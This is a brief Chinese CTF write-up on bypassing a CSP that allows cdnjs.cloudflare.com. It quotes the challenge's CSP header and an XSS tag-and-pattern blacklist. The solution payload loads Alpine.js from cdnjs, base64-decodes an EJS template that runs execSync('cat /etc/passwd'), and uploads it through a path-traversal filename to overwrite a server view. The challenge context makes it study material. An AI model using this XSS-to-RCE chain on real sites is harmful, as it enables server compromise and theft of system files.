---
title: 与CSP cloudflare.com有关的一些利用
---

# src + cdnjs.cloudflare.com XSS

https://mushroom.cat/ctf/full-stack-disaster

题目限制：只能`<script src="..."></script>`；CSP限制不能把自己的payload托管到外面（`"default-src 'self' cdnjs.cloudflare.com 'unsafe-eval';"`）

<details>
<summary>题目原文</summary>

Let's start by our entry point: index.js. The noticeable thing is the csp headers:
Click Pin to keep code visible while reading!
```
  res.setHeader(
    "Content-Security-Policy",
    "default-src 'self' cdnjs.cloudflare.com 'unsafe-eval';"
  );
```
Which in short means:
- Only allow resources from the same origin (self) and cdnjs.cloudflare.com
- Allow eval (unsafe-eval)
This might limit us a bit if there is an XSS. We will see.

For the paste routes where you can create pastes (notes) there is a heavy blacklist middleware:
Click Pin to keep code visible while reading!
```js
const forbiddenTags = [
  'a','a2','abbr','acronym','address','animate','animatemotion','animatetransform','applet','area',
  'article','aside','audio','audio2','b','bdi','bdo','big','blink','blockquote','body','br','button',
  'canvas','caption','center','cite','code','col','colgroup','command','content','custom','data',
  'datalist','dd','del','details','dfn','dialog','dir','dl','dt','element','em','embed',
  'fieldset','figcaption','figure','font','footer','form','frame','frameset','h1','head','header',
  'hgroup','hr','html','i','iframe','iframe2','image','image2','image3','img','img2','input','input2',
  'input3','input4','ins','kbd','keygen','label','legend','li','link','listing','main','map','mark',
  'marquee','menu','menuitem','meta','meter','multicol','nav','nextid','nobr','noembed','noframes',
  'noscript','object','ol','optgroup','option','output','p','param','picture','plaintext','pre',
  'progress','q','rb','rp','rt','rtc','ruby','s','samp','section','select','set','shadow',
  'slot','small','source','spacer','span','strike','strong','style','sub','summary','sup','svg',
  'table','tbody','td','template','textarea','tfoot','th','thead','time','title','tr','track','tt',
  'u','ul','var','video','video2','wbr','xmp'
];

const forbiddenPatterns = forbiddenTags.map(tag => new RegExp(`<\\/?\\s*${tag}\\b`, 'i'));

forbiddenPatterns.push(/on\w+\s*=/i);
forbiddenPatterns.push(/javascript:/i);
forbiddenPatterns.push(/data:text\/javascript/i);
forbiddenPatterns.push(/<script[^>]*>[\s\S]+?<\s*\/script>/i);
```
After some analysis, you can tell it only allows a very limited set of HTML tags including `<script>` tag..?? but not allowing me to write inbetween `<script>` and `</script>`. I can use `<script src=...>` though, I can use any attributes in the allowed tags.
This is interesting. So will I need to host my payload somewhere and load it? but what about the CSP? We will see shortly.

</details>

Sol：我自己写的代码进不去cdnjs，但是只要有人能执行我的代码就行

```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/alpinejs/3.10.5/cdn.min.js" defer></script>
<div x-data x-init="(async () => {
    try {
      const b64 = 'PCU9IGdsb2JhbC5wcm9jZXNzLm1haW5Nb2R1bGUucmVxdWlyZSgiY2hpbGRfcHJvY2VzcyIpLmV4ZWNTeW5jKCJjYXQgL2V0Yy9wYXNzd2QiKS50b1N0cmluZygpICU+';
      const decoded = atob(b64);

      // now put it in a blob
      const blob = new Blob([decoded], { type: 'image/jpeg' });
      const fd = new FormData();
      fd.append('userFile', blob, '..／views///index.ejs.jpeg');
      fd.append('note', 'Extra text field');

      const resp = await fetch('/upload', {
        method: 'POST',
        body: fd,
        credentials: 'include',
	      headers: {'x-csrf-token': 'b72a7f55d8ef61d0d27ee41830ca5cba'}
      });

      const text = await resp.text();
      console.log('Upload response:', text);
    } catch (e) {
      console.error('Upload error:', e);
    }
  })()"></div>
```